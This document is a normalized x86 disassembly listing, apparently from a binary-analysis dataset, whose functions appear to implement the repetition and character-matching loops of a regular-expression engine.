lea eax [ ebp - 0x4 ]
jmp r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
dec eax
mov [ esi ] eax
pop edi
pop ebx
leave
retn 0x8
mov eax [ eax ]
mov [ esi + 0x4c ] eax
sub_422a3d
push ebp
mov ebp esp
push ecx
cmp [ esi + 0x10 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
cmp [ esi + 0x4 ] 0x0
push ebx
mov ebx [ edi ]
jbe r-xdata
push 0x8e
push r--data
push r--data
call sub_4258e2
add esp 0xc
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
push edi
call [ eax + 0x4 ]
test al al
jne r-xdata
mov eax edi
call sub_423be3
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
cmp eax [ esi + 0x8 ]
jae r-xdata
xor al al
mov [ edi ] ebx
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
cmp eax [ esi + 0x4 ]
jb r-xdata
pop ebx
leave
retn 0x8
mov eax edi
call sub_423be3
test al al
jne r-xdata
sub_422ab1
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ esi ]
push ebx
xor ebx ebx
mov [ ebp - 0x4 ] ecx
cmp [ edi + 0x8 ] ebx
jbe r-xdata
cmp [ edi + 0x10 ] 0x0
je r-xdata
mov eax [ esi ]
cmp eax [ esi + 0x10 ]
je r-xdata
cmp [ edi + 0x4 ] ebx
jbe r-xdata
test ebx ebx
je r-xdata
mov [ esi + 0x1d ] 0x1
jmp r-xdata
mov al [ eax ]
mov [ ebp - 0x8 ] al
mov eax [ esi + 0x2c ]
mov ecx [ eax + 0x20c ]
push [ ebp - 0x8 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
cmp al [ edi ]
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
push esi
call [ eax + 0x4 ]
test al al
je r-xdata
mov [ esi ] ecx
jmp r-xdata
cmp ecx [ esi + 0x10 ]
jne r-xdata
cmp ebx [ edi + 0x8 ]
jae r-xdata
mov ecx [ ebp - 0x4 ]
inc [ esi ]
inc ebx
cmp ebx [ edi + 0x8 ]
jae r-xdata
cmp [ edi + 0x4 ] ebx
je r-xdata
mov al 0x1
jmp r-xdata
xor al al
lea eax [ ecx + 0x1 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
jmp r-xdata
mov eax esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
dec ebx
dec [ esi ]
pop ebx
leave
retn 0x8
mov eax [ eax ]
mov [ esi + 0x4c ] eax
sub_422b6a
push ebp
mov ebp esp
push ecx
push ecx
push ebx
xor ebx ebx
cmp [ edi + 0x10 ] bl
je r-xdata
mov eax [ esi ]
mov [ ebp - 0x4 ] eax
cmp [ edi + 0x4 ] ebx
jbe r-xdata
push 0x8e
push r--data
push r--data
call sub_4258e2
add esp 0xc
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
push esi
call [ eax + 0x4 ]
test al al
jne r-xdata
mov eax [ esi ]
cmp eax [ esi + 0x10 ]
je r-xdata
mov al 0x1
jmp r-xdata
mov eax ebx
inc ebx
cmp eax [ edi + 0x8 ]
jae r-xdata
mov [ esi + 0x1d ] 0x1
mov al [ eax ]
mov [ ebp - 0x8 ] al
mov eax [ esi + 0x2c ]
mov ecx [ eax + 0x20c ]
push [ ebp - 0x8 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
cmp al [ edi ]
jne r-xdata
pop ebx
leave
retn 0x8
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
xor al al
mov eax [ esi ]
cmp eax [ esi + 0x10 ]
je r-xdata
inc [ esi ]
inc ebx
cmp ebx [ edi + 0x4 ]
jb r-xdata
mov al [ eax ]
mov [ ebp - 0x8 ] al
mov eax [ esi + 0x2c ]
mov ecx [ eax + 0x20c ]
push [ ebp - 0x8 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
cmp al [ edi ]
jne r-xdata
inc [ esi ]
jmp r-xdata
sub_422c0f
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi eax
mov eax [ edi ]
xor ebx ebx
mov [ ebp - 0x4 ] eax
cmp [ esi + 0x8 ] ebx
jbe r-xdata
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov ecx edi
call sub_423c2f
test al al
je r-xdata
cmp [ esi + 0x4 ] ebx
ja r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
inc ebx
cmp ebx [ esi + 0x8 ]
jb r-xdata
mov [ edi ] eax
xor al al
jmp r-xdata
cmp eax [ edi + 0x10 ]
jne r-xdata
cmp ebx [ esi + 0x8 ]
jae r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
push edi
call [ eax + 0x4 ]
test al al
je r-xdata
lea ecx [ eax + 0x1 ]
mov [ ebp - 0x8 ] ecx
lea ecx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
jmp r-xdata
mov ecx edi
jmp r-xdata
cmp [ esi + 0x4 ] ebx
je r-xdata
mov al 0x1
jmp r-xdata
mov ecx [ ecx ]
mov [ edi + 0x4c ] ecx
mov eax [ ebp - 0x4 ]
dec ebx
dec [ edi ]
pop esi
pop ebx
leave
retn 0x8
sub_422ca7
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
cmp [ esi + 0x4 ] 0x0
mov ebx [ edi ]
jbe r-xdata
push 0x8e
push r--data
push r--data
call sub_4258e2
add esp 0xc
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
push edi
call [ eax + 0x4 ]
test al al
jne r-xdata
mov ecx edi
call sub_423c2f
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
cmp eax [ esi + 0x8 ]
jae r-xdata
xor al al
mov [ edi ] ebx
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
cmp eax [ esi + 0x4 ]
jb r-xdata
pop esi
pop ebx
leave
retn 0x8
mov ecx edi
call sub_423c2f
test al al
jne r-xdata
sub_422d1f
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi eax
mov eax [ edi ]
xor ebx ebx
mov [ ebp - 0x4 ] eax
cmp [ esi + 0x8 ] ebx
jbe r-xdata
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov eax edi
call sub_423c49
test al al
je r-xdata
cmp [ esi + 0x4 ] ebx
ja r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
inc ebx
cmp ebx [ esi + 0x8 ]
jb r-xdata
mov [ edi ] eax
xor al al
jmp r-xdata
cmp eax [ edi + 0x10 ]
jne r-xdata
cmp ebx [ esi + 0x8 ]
jae r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
push edi
call [ eax + 0x4 ]
test al al
je r-xdata
lea ecx [ eax + 0x1 ]
mov [ ebp - 0x8 ] ecx
lea ecx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
jmp r-xdata
mov ecx edi
jmp r-xdata
cmp [ esi + 0x4 ] ebx
je r-xdata
mov al 0x1
jmp r-xdata
mov ecx [ ecx ]
mov [ edi + 0x4c ] ecx
mov eax [ ebp - 0x4 ]
dec ebx
dec [ edi ]
pop esi
pop ebx
leave
retn 0x8
sub_422db4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
cmp [ esi + 0x4 ] 0x0
mov ebx [ edi ]
jbe r-xdata
push 0x8e
push r--data
push r--data
call sub_4258e2
add esp 0xc
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
push edi
call [ eax + 0x4 ]
test al al
jne r-xdata
mov eax edi
call sub_423c49
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
cmp eax [ esi + 0x8 ]
jae r-xdata
xor al al
mov [ edi ] ebx
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
cmp eax [ esi + 0x4 ]
jb r-xdata
pop esi
pop ebx
leave
retn 0x8
mov eax edi
call sub_423c49
test al al
jne r-xdata
sub_422e6a
push ebp
mov ebp esp
push esi
push edi
mov edi eax
mov esi ecx
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jne r-xdata
push 0xffffffff
push 0x0
push esi
mov ecx edi
call sub_404e0f
mov eax [ esi + 0x1c ]
mov [ edi + 0x1c ] eax
add edi 0x20
add esi 0x20
mov eax edi
pop edi
pop esi
pop ebp
retn
sub_422ef9
push ebp
mov ebp esp
push [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_423c9a
xor ecx ecx
add esp 0xc
cmp [ ebp + 0xc ] eax
setne al
pop ebp
retn
sub_422f1a
push ebp
mov ebp esp
push ecx
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_4235b5
pop edi
leave
retn 0x8
sub_422f39
push ebp
mov ebp esp
push ecx
cmp [ eax + 0x28 ] 0x1
jne r-xdata
cmp [ eax + 0x20 ] 0x0
je r-xdata
inc [ ecx + 0x1c ]
cmp [ ecx + 0x1c ] 0x0
setg dl
mov [ eax + 0x2c ] dl
mov eax [ ecx ]
call sub_408952
lea edx [ ebp - 0x1 ]
push edx
push ecx
call sub_41c5a5
jmp r-xdata
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_422f70
push ebp
mov ebp esp
push ecx
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_42364f
pop edi
leave
retn 0x8
sub_422f8f
push ebp
mov ebp esp
push ecx
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ecx ]
call sub_408952
lea edx [ ebp - 0x1 ]
push edx
push ecx
call sub_41c5a5
jmp r-xdata
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_422fb3
push ebp
mov ebp esp
push ecx
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_4236c7
pop edi
leave
retn 0x8
sub_422fd2
push ebp
mov ebp esp
push ecx
cmp [ eax + 0x28 ] 0x1
jne r-xdata
cmp [ eax + 0x20 ] 0x0
je r-xdata
inc [ ecx + 0x1c ]
cmp [ ecx + 0x1c ] 0x0
setg dl
mov [ eax + 0x2c ] dl
mov eax [ ecx ]
call sub_408952
lea edx [ ebp - 0x1 ]
push edx
push ecx
call sub_41c621
jmp r-xdata
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_423009
push ebp
mov ebp esp
push ecx
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_423761
pop edi
leave
retn 0x8
sub_423028
push ebp
mov ebp esp
push ecx
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ecx ]
call sub_408952
lea edx [ ebp - 0x1 ]
push edx
push ecx
call sub_41c621
jmp r-xdata
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_42304c
push ebp
mov ebp esp
push ecx
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4237d9
pop edi
leave
retn 0x8
sub_42306b
push ebp
mov ebp esp
cmp [ ecx + 0x40 ] 0x1
jne r-xdata
mov eax [ eax ]
call sub_408952
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
inc [ eax + 0x1c ]
cmp [ eax + 0x1c ] 0x0
setg dl
mov [ ecx + 0x44 ] dl
sub_42308f
push ebp
mov ebp esp
push ecx
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4238a6
pop edi
leave
retn 0x8
sub_4230bf
push ebp
mov ebp esp
push ecx
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_42396c
pop edi
leave
retn 0x4
sub_4230db
push ebp
mov ebp esp
cmp [ ecx + 0x40 ] 0x1
jne r-xdata
mov eax [ eax ]
call sub_408952
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
inc [ eax + 0x1c ]
cmp [ eax + 0x1c ] 0x0
setg dl
mov [ ecx + 0x44 ] dl
sub_4230ff
push ebp
mov ebp esp
push ecx
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_423a2c
pop edi
leave
retn 0x4
sub_42313f
mov edx [ ecx ]
mov [ eax ] edx
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov dl [ ecx + 0x8 ]
mov [ eax + 0x8 ] dl
mov edx [ ecx + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ ecx + 0x10 ]
mov [ eax + 0x10 ] edx
mov cl [ ecx + 0x14 ]
mov [ eax + 0x14 ] cl
retn
sub_42317d
push 0x4
mov eax sub_44df27
call sub_448595
mov edi ecx
mov [ ebp - 0x10 ] edi
and [ ebp - 0x4 ] 0x0
lea esi [ edi + 0x14 ]
jmp r-xdata
cmp [ esi + 0x4 ] esi
jne r-xdata
mov ecx esi
call sub_41f0d2
or [ ebp - 0x4 ] 0xffffffff
lea esi [ edi + 0x4 ]
call sub_41f904
call sub_44866d
retn
sub_4234a9
push ebp
mov ebp esp
push ecx
mov eax [ esi ]
cmp eax [ esi + 0x10 ]
jne r-xdata
mov al [ eax ]
mov [ ebp - 0x4 ] al
mov eax [ esi + 0x2c ]
mov ecx [ eax + 0x20c ]
push [ ebp - 0x4 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
mov ecx [ ebp + 0x8 ]
cmp al [ ecx ]
jne r-xdata
mov [ esi + 0x1d ] 0x1
xor al al
inc [ esi ]
mov al 0x1
jmp r-xdata
leave
retn 0x4
sub_4234eb
push 0x8
mov eax sub_44cd19
call sub_4485c8
mov edi ecx
mov eax [ ebp + 0xc ]
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0xc ]
call sub_44866d
retn
push [ ebp + 0xc ]
call sub_423d77
add [ ebp + 0xc ] 0x20
add edi 0x20
jmp r-xdata
cmp edi [ ebp + 0x8 ]
je r-xdata
sub_423519
mov esi [ ebp - 0x14 ]
jmp r-xdata
push 0x0
cmp esi [ ebp + 0xc ]
jne r-xdata
push 0x1
mov ecx esi
call sub_40487c
add esi 0x20
push 0x0
call sub_426f77
mov eax [ ebp + 0xc ]
call sub_44866d
retn
sub_42354a
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp esi [ ebp + 0x8 ]
jne r-xdata
mov ecx esi
call sub_42313f
add [ ebp + 0xc ] 0x18
add esi 0x18
pop esi
pop ebp
retn
sub_42357b
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax [ ebp + 0xc ]
je r-xdata
pop ebp
retn
mov edx [ ecx ]
mov eax [ eax + 0x4 ]
inc edx
mov [ ebp + 0x8 ] eax
cmp eax [ ebp + 0xc ]
jne r-xdata
mov [ ecx ] edx
sub_4235b5
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov esi eax
mov eax [ esi ]
mov edi ecx
xor ebx ebx
mov [ ebp - 0x4 ] eax
cmp [ edi + 0x24 ] ebx
jbe r-xdata
cmp [ edi + 0x2c ] 0x0
je r-xdata
call sub_423db8
test al al
je r-xdata
cmp [ edi + 0x20 ] ebx
ja r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
inc ebx
cmp ebx [ edi + 0x24 ]
jb r-xdata
mov [ esi ] eax
xor al al
jmp r-xdata
cmp eax [ esi + 0x10 ]
jne r-xdata
cmp ebx [ edi + 0x24 ]
jae r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
push esi
call [ eax + 0x4 ]
test al al
je r-xdata
lea ecx [ eax + 0x1 ]
mov [ ebp - 0x8 ] ecx
lea ecx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
jmp r-xdata
mov ecx esi
jmp r-xdata
cmp [ edi + 0x20 ] ebx
je r-xdata
mov al 0x1
jmp r-xdata
mov ecx [ ecx ]
mov [ esi + 0x4c ] ecx
mov eax [ ebp - 0x4 ]
dec ebx
dec [ esi ]
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_42364f
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
cmp [ edi + 0x2c ] 0x0
mov esi eax
je r-xdata
and [ ebp - 0x4 ] 0x0
cmp [ edi + 0x20 ] 0x0
mov ebx [ esi ]
jbe r-xdata
push 0x8e
push r--data
push r--data
call sub_4258e2
add esp 0xc
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
push esi
call [ eax + 0x4 ]
test al al
jne r-xdata
call sub_423db8
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
cmp eax [ edi + 0x24 ]
jae r-xdata
xor al al
mov [ esi ] ebx
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
cmp eax [ edi + 0x20 ]
jb r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
call sub_423db8
test al al
jne r-xdata
sub_4236c7
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov esi eax
mov eax [ esi ]
mov edi ecx
xor ebx ebx
mov [ ebp - 0x4 ] eax
cmp [ edi + 0x24 ] ebx
jbe r-xdata
cmp [ edi + 0x2c ] 0x0
je r-xdata
call sub_423df3
test al al
je r-xdata
cmp [ edi + 0x20 ] ebx
ja r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
inc ebx
cmp ebx [ edi + 0x24 ]
jb r-xdata
mov [ esi ] eax
xor al al
jmp r-xdata
cmp eax [ esi + 0x10 ]
jne r-xdata
cmp ebx [ edi + 0x24 ]
jae r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
push esi
call [ eax + 0x4 ]
test al al
je r-xdata
lea ecx [ eax + 0x1 ]
mov [ ebp - 0x8 ] ecx
lea ecx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
jmp r-xdata
mov ecx esi
jmp r-xdata
cmp [ edi + 0x20 ] ebx
je r-xdata
mov al 0x1
jmp r-xdata
mov ecx [ ecx ]
mov [ esi + 0x4c ] ecx
mov eax [ ebp - 0x4 ]
dec ebx
dec [ esi ]
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_423761
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
cmp [ edi + 0x2c ] 0x0
mov esi eax
je r-xdata
and [ ebp - 0x4 ] 0x0
cmp [ edi + 0x20 ] 0x0
mov ebx [ esi ]
jbe r-xdata
push 0x8e
push r--data
push r--data
call sub_4258e2
add esp 0xc
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
push esi
call [ eax + 0x4 ]
test al al
jne r-xdata
call sub_423df3
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
cmp eax [ edi + 0x24 ]
jae r-xdata
xor al al
mov [ esi ] ebx
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
cmp eax [ edi + 0x20 ]
jb r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
call sub_423df3
test al al
jne r-xdata
sub_4237d9
push ebp
mov ebp esp
sub esp 0xc
and [ ebp - 0x4 ] 0x0
mov eax [ ebx ]
push esi
push edi
mov edi [ ebp + 0x8 ]
cmp [ edi + 0x3c ] 0x0
mov [ ebp - 0x8 ] eax
jbe r-xdata
cmp [ edi + 0x44 ] 0x0
mov edx [ ebp - 0x4 ]
je r-xdata
mov ecx [ ebx ]
cmp ecx [ ebx + 0x10 ]
je r-xdata
cmp [ edi + 0x38 ] edx
ja r-xdata
test edx edx
je r-xdata
mov [ ebx + 0x1d ] 0x1
jmp r-xdata
mov esi [ ebx + 0x2c ]
xor eax eax
lea edi [ ebp - 0xc ]
stosb [ edi ]
movzx eax [ ecx ]
push [ ebp - 0xc ]
add esi 0x8
push eax
mov eax [ ebp + 0x8 ]
call sub_4205c5
test al al
je r-xdata
mov [ ebx ] eax
xor al al
mov esi [ ebp + 0xc ]
jmp r-xdata
cmp eax [ ebx + 0x10 ]
jne r-xdata
cmp edx [ edi + 0x3c ]
jae r-xdata
mov edi [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
inc [ ebx ]
inc [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
cmp ecx [ eax + 0x3c ]
jae r-xdata
mov eax [ esi ]
push ebx
mov ecx esi
call [ eax + 0x4 ]
test al al
je r-xdata
lea ecx [ eax + 0x1 ]
mov [ ebp + 0x8 ] ecx
lea ecx [ ebp + 0x8 ]
lea ecx [ ebp - 0x8 ]
jmp r-xdata
mov ecx ebx
jmp r-xdata
mov edi eax
mov eax [ ebp - 0x8 ]
jmp r-xdata
mov eax [ edi + 0x38 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov al 0x1
jmp r-xdata
mov ecx [ ecx ]
mov [ ebx + 0x4c ] ecx
mov eax [ ebp - 0x8 ]
dec [ ebp - 0x4 ]
dec [ ebx ]
pop edi
pop esi
leave
retn 0xc
sub_4238a6
push ebp
mov ebp esp
sub esp 0xc
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x44 ] 0x0
push edi
je r-xdata
mov eax [ ebx ]
and [ ebp - 0x4 ] 0x0
cmp [ esi + 0x38 ] 0x0
mov [ ebp - 0x8 ] eax
jbe r-xdata
push 0x8e
push r--data
push r--data
call sub_4258e2
add esp 0xc
mov ecx [ ebp + 0xc ]
mov eax [ ecx ]
push ebx
call [ eax + 0x4 ]
test al al
jne r-xdata
mov ecx [ ebx ]
cmp ecx [ ebx + 0x10 ]
je r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
inc [ ebp - 0x4 ]
cmp eax [ ecx + 0x3c ]
jae r-xdata
mov [ ebx + 0x1d ] 0x1
mov esi [ ebx + 0x2c ]
xor eax eax
lea edi [ ebp - 0xc ]
stosb [ edi ]
movzx eax [ ecx ]
push [ ebp - 0xc ]
mov edi [ ebp + 0x8 ]
push eax
add esi 0x8
mov eax edi
call sub_4205c5
test al al
je r-xdata
pop edi
pop esi
leave
retn 0xc
mov eax [ ebp - 0x8 ]
mov [ ebx ] eax
xor al al
mov ecx [ ebx ]
cmp ecx [ ebx + 0x10 ]
je r-xdata
inc [ ebx ]
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
cmp eax [ edi + 0x38 ]
jb r-xdata
mov esi [ ebx + 0x2c ]
xor eax eax
lea edi [ ebp - 0xc ]
stosb [ edi ]
movzx eax [ ecx ]
push [ ebp - 0xc ]
add esi 0x8
push eax
mov eax [ ebp + 0x8 ]
call sub_4205c5
test al al
je r-xdata
inc [ ebx ]
jmp r-xdata
sub_42396c
push ebp
mov ebp esp
sub esp 0xc
and [ ebp - 0x4 ] 0x0
cmp [ ebx + 0x3c ] 0x0
mov eax [ esi ]
push edi
mov [ ebp - 0x8 ] eax
jbe r-xdata
cmp [ ebx + 0x44 ] 0x0
mov edx [ ebp - 0x4 ]
je r-xdata
mov ecx [ esi ]
cmp ecx [ esi + 0x10 ]
je r-xdata
cmp [ ebx + 0x38 ] edx
ja r-xdata
test edx edx
je r-xdata
mov [ esi + 0x1d ] 0x1
jmp r-xdata
xor eax eax
lea edi [ ebp - 0xc ]
stosb [ edi ]
mov eax [ esi + 0x2c ]
push [ ebp - 0xc ]
add eax 0x8
push eax
movzx eax [ ecx ]
push eax
mov eax ebx
call sub_420611
test al al
je r-xdata
mov [ esi ] eax
xor al al
mov edi [ ebp + 0x8 ]
jmp r-xdata
cmp eax [ esi + 0x10 ]
jne r-xdata
cmp edx [ ebx + 0x3c ]
jae r-xdata
mov eax [ ebp - 0x8 ]
inc [ esi ]
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
cmp eax [ ebx + 0x3c ]
jae r-xdata
mov eax [ edi ]
push esi
mov ecx edi
call [ eax + 0x4 ]
test al al
je r-xdata
lea ecx [ eax + 0x1 ]
mov [ ebp - 0xc ] ecx
lea ecx [ ebp - 0xc ]
lea ecx [ ebp - 0x8 ]
jmp r-xdata
mov ecx esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
jmp r-xdata
mov eax [ ebx + 0x38 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov al 0x1
jmp r-xdata
mov ecx [ ecx ]
mov [ esi + 0x4c ] ecx
mov eax [ ebp - 0x8 ]
dec [ ebp - 0x4 ]
dec [ esi ]
pop edi
leave
retn 0x8
sub_423a2c
push ebp
mov ebp esp
sub esp 0xc
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov eax [ esi ]
and [ ebp - 0x4 ] 0x0
cmp [ ebx + 0x38 ] 0x0
push edi
mov [ ebp - 0x8 ] eax
jbe r-xdata
push 0x8e
push r--data
push r--data
call sub_4258e2
add esp 0xc
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
push esi
call [ eax + 0x4 ]
test al al
jne r-xdata
mov ecx [ esi ]
cmp ecx [ esi + 0x10 ]
je r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
cmp eax [ ebx + 0x3c ]
jae r-xdata
mov [ esi + 0x1d ] 0x1
xor eax eax
lea edi [ ebp - 0xc ]
stosb [ edi ]
mov eax [ esi + 0x2c ]
push [ ebp - 0xc ]
add eax 0x8
push eax
movzx eax [ ecx ]
push eax
mov eax ebx
call sub_420611
test al al
je r-xdata
pop edi
leave
retn 0x8
mov eax [ ebp - 0x8 ]
mov [ esi ] eax
xor al al
mov ecx [ esi ]
cmp ecx [ esi + 0x10 ]
je r-xdata
inc [ esi ]
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
cmp eax [ ebx + 0x38 ]
jb r-xdata
xor eax eax
lea edi [ ebp - 0xc ]
stosb [ edi ]
mov eax [ esi + 0x2c ]
push [ ebp - 0xc ]
add eax 0x8
push eax
movzx eax [ ecx ]
push eax
mov eax ebx
call sub_420611
test al al
je r-xdata
inc [ esi ]
jmp r-xdata
sub_423b01
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebx + 0x14 ] 0x10
mov eax [ esi ]
push edi
mov [ ebp - 0x8 ] eax
jb r-xdata
mov edi ebx
jmp r-xdata
mov edi [ ebx ]
jmp r-xdata
cmp edi [ ebx + 0x1c ]
jne r-xdata
mov eax [ esi ]
cmp eax [ esi + 0x10 ]
je r-xdata
mov al 0x1
mov [ esi + 0x1d ] 0x1
mov al [ eax ]
mov [ ebp - 0x4 ] al
mov eax [ esi + 0x2c ]
mov ecx [ eax + 0x20c ]
push [ ebp - 0x4 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
cmp al [ edi ]
jne r-xdata
pop edi
leave
retn
mov eax [ ebp - 0x8 ]
mov [ esi ] eax
xor al al
jmp r-xdata
inc edi
inc [ esi ]
sub_423b55
push ebp
mov ebp esp
push ecx
cmp [ edi + 0x14 ] 0x10
mov ecx [ eax ]
mov [ ebp - 0x4 ] ecx
jb r-xdata
mov ecx edi
mov ecx [ edi ]
jmp r-xdata
mov al 0x1
mov edx [ eax + 0x10 ]
push ebx
push esi
cmp ecx [ edi + 0x1c ]
je r-xdata
mov [ eax + 0x1d ] 0x1
mov bl [ esi ]
cmp bl [ ecx ]
jne r-xdata
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
xor al al
jmp r-xdata
inc ecx
inc esi
mov [ eax ] esi
cmp ecx [ edi + 0x1c ]
jne r-xdata
mov esi [ eax ]
cmp esi edx
je r-xdata
sub_423b9c
mov eax [ ecx ]
cmp eax [ ecx + 0x10 ]
jne r-xdata
mov dl [ eax ]
cmp dl [ esi ]
je r-xdata
mov [ ecx + 0x1d ] 0x1
xor al al
retn
inc eax
mov [ ecx ] eax
mov al 0x1
retn
sub_423bb6
mov ecx [ edi ]
push esi
mov esi eax
cmp ecx [ edi + 0x10 ]
jne r-xdata
movzx ecx [ ecx ]
mov eax [ edi + 0x2c ]
add eax 0x8
push ecx
push eax
call sub_419e2c
cmp [ esi + 0x2 ] al
je r-xdata
mov [ edi + 0x1d ] 0x1
xor al al
pop esi
retn
inc [ edi ]
mov al 0x1
pop esi
retn
sub_423bf7
push ebp
mov ebp esp
push ecx
mov eax [ esi ]
cmp eax [ esi + 0x10 ]
jne r-xdata
mov al [ eax ]
mov [ ebp - 0x4 ] al
mov eax [ esi + 0x2c ]
mov ecx [ eax + 0x20c ]
push [ ebp - 0x4 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
